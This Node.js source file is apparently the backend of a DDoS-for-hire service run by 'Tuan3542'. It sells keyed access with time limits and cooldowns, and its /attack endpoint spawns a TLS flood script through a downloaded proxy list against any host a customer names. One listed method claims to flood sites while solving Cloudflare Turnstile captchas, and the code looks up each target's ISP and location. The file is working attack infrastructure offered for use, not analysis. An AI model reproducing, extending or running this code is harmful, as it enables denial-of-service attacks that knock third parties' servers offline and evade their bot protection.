const express = require("express")
const { spawn } = require("child_process");
const axios = require("axios")
const fs = require("fs")
const https = require("https")
const { exec } = require('child_process')
const dns = require("dns").promises 
const app = express()
const port = 27875
const adminkeyxx = "tuan3542"
async function laythongtarget(host, urlx) {
    try {
        const addresses = await dns.resolve4(urlx) 
        const ixp = addresses[0]
        const laydulieu = await axios.get(`https://ipinfo.io/${ixp}/json`)
        const { ip, isp, org, country, timezone, city } = laydulieu.data;
        return {
            isp: isp,
            ip: ip,
            org: org,
            country: country,
            timezone: timezone,
            city: city,
        }
    } catch (error) {
        return {
            isp: 'unknow',
            ip: 'unknow',
            org: 'unknow',
            country: 'unknow',
            timezone: 'unknow',
            city: 'unknow'
        }
    }
}

app.get('/addkey', (req, res) => {
    const { keyadmin, key, time, cooldown} = req.query;
    if (!keyadmin || !key || !time ||!cooldown) {
        return res.json({
            path: '/addkey?keyadmin=&key=&time=&cooldown='
        })
    }
    if (keyadmin !== adminkeyxx) {
        res.json('Invail Key')
        return;
    }
    fs.readFile('./user.json', 'utf-8', (err, jsonString) => {
        if (err) {
            res.send('error')
            return;
        }
        try {
            let data = JSON.parse(jsonString)
            if (!Array.isArray(data.users)) {
                data.users = []
            }
            if (data.users.some(user => user.key === key)) {
                return res.status(404).json({
                    error: 'Key Already Exists'
                })
            }
            data.users.push({
                key: key,
                time: time,
                last: 0,
                cooldown: cooldown,
            })
            fs.writeFile('./user.json', JSON.stringify(data, null, 2), 'utf-8', (err) => {
                if (err) {
                    res.send(err)
                    return;
                }
                res.json({
                    NewKeyIs: key,
                    MaxTime: time,
                    Cooldown: cooldown
                })
            })
        } catch (parseErr) {
            res.send(parseErr)
        }
    })
})

app.get('/rmkey', (req, res) => {
    const { keyadmin, keyrm } = req.query;
    if (!keyadmin || !keyrm) {
        res.json({
            path: '/rmkey?keyadmin=&keyrm=',
        })
        return;
    }
    if (keyadmin !== adminkeyxx) {
        res.json('Sai Key Admin')
        return;
    }
    fs.readFile('./user.json', 'utf-8', (err, jsonString) => {
        if (err) {
            res.send(err)
            return;
        }
        try {
            const data = JSON.parse(jsonString)
            const user = data.users.filter(user => user.key !== keyrm)
            data.users = user
            fs.writeFile('./user.json', JSON.stringify(data, null, 2), 'utf-8', (err) => {
                if (err) {
                    res.send(err)
                    return;
                }
                return res.json({
                    status: 'Key Remove Successfully'
                })
            })
        } catch (parseErr) {
            return res.send(parseErr)
        }
    })
})

app.get('/attack', async (req, res) => {
    const { key, host, port, time, method } = req.query;

    if (!key || !host || !port || !time || !method) {
        return res.status(404).json({
            path: '/attack?key=&host=&port=&time=&method=',
        })
    }

    let urlx
    try {
        urlx = new URL(host)
    } catch {
        return res.status(400).json({ error: "Invalid host format" })
    }

    const info = await laythongtarget(host, urlx.hostname)

    fs.readFile('./user.json', 'utf-8', (err, jsonString) => {
        try {
            if (err) throw err;
            const data = JSON.parse(jsonString)
            if (Array.isArray(data.users)) {
                const user = data.users.find(user => user.key === key)
                if (!user) {
                    res.status(404).json('Invail Key')
                    return;
                }

                let now = Date.now()
                let last = user.last
                let cooldown = user.cooldown * 1000

                const maxtime = parseInt(user.time)
                if (parseInt(time) > maxtime) {
                    res.status(404).json(`Max Time Is ${maxtime}`)
                    return;
                }

                if (last === 0 || now - last >= cooldown) {
                    user.last = now;
                    fs.writeFileSync('./user.json', JSON.stringify(data, null, 2))
                } else {
                    var wait = Math.ceil((cooldown - (now - last)) / 1000)
                    res.status(404).json({
                        Cooldown: wait
                    })
                    return;
                }

                if (method === "tls") {
                    const attack = spawn("node", ["tls.js", host, time, "32", "3", "proxy.txt"]);
                
                    attack.stdout.on("data", data => {
                        console.log(`[TLS] ${data}`);
                    });
                
                    attack.stderr.on("data", data => {
                        console.error(`[TLS ERROR] ${data}`);
                    });
                
                    attack.on("close", code => {
                        console.log(`[TLS] process exited with code ${code}`);
                    });
                
                    res.status(200).json({
                        status: "Success",
                        message: "Tuan3542 API Infomation",
                        detail: { host, port, time, method },
                        targetdetail: info
                    });
                } if (method === "browser") {
                    const attack = spawn("node", ["tls.js", host, time, "32", "2", "proxy.txt"]);
                
                    attack.stdout.on("data", data => {
                        console.log(`[browser] ${data}`);
                    });
                
                    attack.stderr.on("data", data => {
                        console.error(`[browser] ${data}`);
                    });
                
                    attack.on("close", code => {
                        console.log(`[browser] process exited with code ${code}`);
                    });
                
                    res.status(200).json({
                        status: "Success",
                        message: "Tuan3542 API Infomation",
                        detail: { host, port, time, method },
                        targetdetail: info
                    });
                }
            }
        } catch (parseErr) {
            res.status(404).json(parseErr)
        }
    })
})
app.get('/methods', (req, res) => {
    res.status(200).json({
        tls: 'Attack To Server With TLS Method',
        browser: 'Flood & Solve Cloudflare Captcha Turnstile',
    })
})
app.get('/account', (req, res) => {
    const { key } = req.query
    if (!key) {
        return res.status(404).json({
            path: "/account?key="
        })
    }
    fs.readFile('./user.json', 'utf-8', (err, jsonString) => {
        try {
            if (err) throw err;
            const data = JSON.parse(jsonString)
            if (Array.isArray(data.users)) {
                const u = data.users.find(u => u.key === key)
                nickname = u.key;
                maxtime = u.time 
                cooldown = u.cooldown 
                return res.status(200).json({
                    UserName: nickname,
                    MaxTime: maxtime,
                    Cooldown: cooldown,
                })
            }
        } catch (parseErr) {
            return res.status(404).json({
                error: parseErr
            })
        }
    })
})
app.get("/uploadproxy", (req, res) => {
    const url = "tukiemlinkproxy";
    const file = fs.createWriteStream("proxy.txt");
  
    https.get(url, (response) => {
      response.pipe(file);
      file.on("finish", () => {
        file.close();
        console.log("Downloaded proxy.txt");
      });
    });
  
    res.status(200).json({
      status: "Success",
      message: "Tuan3542 API Infomation",
    });
  });

app.get('/help', (req, res) => {
    res.status(200).json({
        OwnerAPI: 'Tuan3542',
        help: 'Show Help Page In API',
        methods: 'Show Methods Page In API',
        addkey: 'This Commands For Admin',
        rmkey: 'This Commands For Admin',
        account:'Show Account Infomation',
        attack: 'Attack A Server With API But You Need A Key'
    })
})

app.listen(port, () => {
    console.log(`Api Running In : localhost:${port}`)
})
